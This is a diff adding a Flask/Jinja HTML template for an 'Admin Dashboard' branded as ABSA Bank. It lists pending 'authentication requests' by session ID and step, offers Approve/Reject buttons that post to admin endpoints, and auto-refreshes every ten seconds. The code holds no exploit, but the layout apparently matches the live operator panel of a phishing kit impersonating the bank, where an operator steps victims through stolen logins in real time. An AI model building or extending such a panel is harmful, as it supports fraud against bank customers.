@@ -1,0 +1,301 @@
+{% extends "base.html" %}
+
+{% block title %}Admin Dashboard - ABSA Bank{% endblock %}
+
+{% block extra_css %}
+<style>
+  .admin-dashboard {
+    max-width: 1200px;
+    margin: 20px auto;
+    padding: 0 20px;
+  }
+
+  .admin-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 30px;
+    padding: 20px;
+    background: var(--primary);
+    color: #fff;
+    border-radius: 8px;
+  }
+
+  .admin-header h1 {
+    margin: 0;
+    font-size: 24px;
+  }
+
+  .logout-btn {
+    background: rgba(255,255,255,0.2);
+    color: #fff;
+    border: 1px solid rgba(255,255,255,0.3);
+    padding: 8px 16px;
+    border-radius: 4px;
+    text-decoration: none;
+    font-size: 14px;
+  }
+
+  .logout-btn:hover {
+    background: rgba(255,255,255,0.3);
+  }
+
+  .pending-requests {
+    background: #fff;
+    border-radius: 8px;
+    box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+    overflow: hidden;
+  }
+
+  .section-header {
+    background: #f8f9fa;
+    padding: 20px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .section-header h2 {
+    margin: 0;
+    color: var(--text-dark);
+    font-size: 20px;
+  }
+
+  .requests-list {
+    padding: 0;
+  }
+
+  .request-item {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 20px;
+    border-bottom: 1px solid #f0f0f0;
+  }
+
+  .request-item:last-child {
+    border-bottom: none;
+  }
+
+  .request-info {
+    flex: 1;
+  }
+
+  .request-user {
+    font-weight: 600;
+    color: var(--text-dark);
+    margin-bottom: 5px;
+  }
+
+  .request-step {
+    color: var(--text-light);
+    font-size: 14px;
+    margin-bottom: 5px;
+  }
+
+  .request-time {
+    color: var(--text-light);
+    font-size: 12px;
+  }
+
+  .request-actions {
+    display: flex;
+    gap: 10px;
+  }
+
+  .approve-btn {
+    background: #28a745;
+    color: #fff;
+    border: none;
+    padding: 8px 16px;
+    border-radius: 4px;
+    cursor: pointer;
+    font-size: 14px;
+  }
+
+  .approve-btn:hover {
+    background: #218838;
+  }
+
+  .reject-btn {
+    background: #dc3545;
+    color: #fff;
+    border: none;
+    padding: 8px 16px;
+    border-radius: 4px;
+    cursor: pointer;
+    font-size: 14px;
+  }
+
+  .reject-btn:hover {
+    background: #c82333;
+  }
+
+  .no-requests {
+    padding: 40px 20px;
+    text-align: center;
+    color: var(--text-light);
+  }
+
+  .stats-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+    gap: 20px;
+    margin-bottom: 30px;
+  }
+
+  .stat-card {
+    background: #fff;
+    padding: 20px;
+    border-radius: 8px;
+    box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+    text-align: center;
+  }
+
+  .stat-number {
+    font-size: 32px;
+    font-weight: bold;
+    color: var(--primary);
+    margin-bottom: 5px;
+  }
+
+  .stat-label {
+    color: var(--text-light);
+    font-size: 14px;
+  }
+
+  .refresh-btn {
+    background: var(--accent);
+    color: #fff;
+    border: none;
+    padding: 10px 20px;
+    border-radius: 4px;
+    cursor: pointer;
+    font-size: 14px;
+    margin-left: 10px;
+  }
+
+  .refresh-btn:hover {
+    background: #e55b00;
+  }
+</style>
+{% endblock %}
+
+{% block content %}
+<div class="admin-dashboard">
+  <div class="admin-header">
+    <h1>Admin Dashboard</h1>
+    <div>
+      <button onclick="refreshRequests()" class="refresh-btn">Refresh</button>
+      <a href="{{ url_for('admin_logout') }}" class="logout-btn">Logout</a>
+    </div>
+  </div>
+
+  <div class="stats-grid">
+    <div class="stat-card">
+      <div class="stat-number" id="pending-count">{{ pending_count or 0 }}</div>
+      <div class="stat-label">Pending Requests</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-number" id="approved-count">{{ approved_count or 0 }}</div>
+      <div class="stat-label">Approved Today</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-number" id="rejected-count">{{ rejected_count or 0 }}</div>
+      <div class="stat-label">Rejected Today</div>
+    </div>
+  </div>
+
+  <div class="pending-requests">
+    <div class="section-header">
+      <h2>Pending Authentication Requests</h2>
+    </div>
+    <div class="requests-list" id="requests-list">
+      {% if pending_requests %}
+        {% for request in pending_requests %}
+        <div class="request-item" data-request-id="{{ request.id }}">
+          <div class="request-info">
+            <div class="request-user">Session: {{ request.session_id[:8] }}...</div>
+            <div class="request-step">Step: {{ request.step_name }}</div>
+            <div class="request-time">{{ request.created_at.strftime('%Y-%m-%d %H:%M:%S') }}</div>
+          </div>
+          <div class="request-actions">
+            <button onclick="approveRequest('{{ request.id }}')" class="approve-btn">Approve</button>
+            <button onclick="rejectRequest('{{ request.id }}')" class="reject-btn">Reject</button>
+          </div>
+        </div>
+        {% endfor %}
+      {% else %}
+        <div class="no-requests">
+          No pending requests at this time.
+        </div>
+      {% endif %}
+    </div>
+  </div>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+  function approveRequest(requestId) {
+    fetch('/admin/approve/' + requestId, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      }
+    })
+    .then(response => response.json())
+    .then(data => {
+      if (data.success) {
+        // Remove the request from the list
+        const requestItem = document.querySelector(`[data-request-id="${requestId}"]`);
+        if (requestItem) {
+          requestItem.remove();
+        }
+        // Update stats
+        refreshRequests();
+        alert('Request approved successfully');
+      } else {
+        alert('Error approving request: ' + data.message);
+      }
+    })
+    .catch(error => {
+      console.error('Error:', error);
+      alert('Error approving request');
+    });
+  }
+
+  function rejectRequest(requestId) {
+    fetch('/admin/reject/' + requestId, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      }
+    })
+    .then(response => response.json())
+    .then(data => {
+      if (data.success) {
+        // Remove the request from the list
+        const requestItem = document.querySelector(`[data-request-id="${requestId}"]`);
+        if (requestItem) {
+          requestItem.remove();
+        }
+        // Update stats
+        refreshRequests();
+        alert('Request rejected');
+      } else {
+        alert('Error rejecting request: ' + data.message);
+      }
+    })
+    .catch(error => {
+      console.error('Error:', error);
+      alert('Error rejecting request');
+    });
+  }
+
+  function refreshRequests() {
+    location.reload();
+  }
+
+  // Auto-refresh every 10 seconds
+  setInterval(refreshRequests, 10000);
+</script>
+{% endblock %}
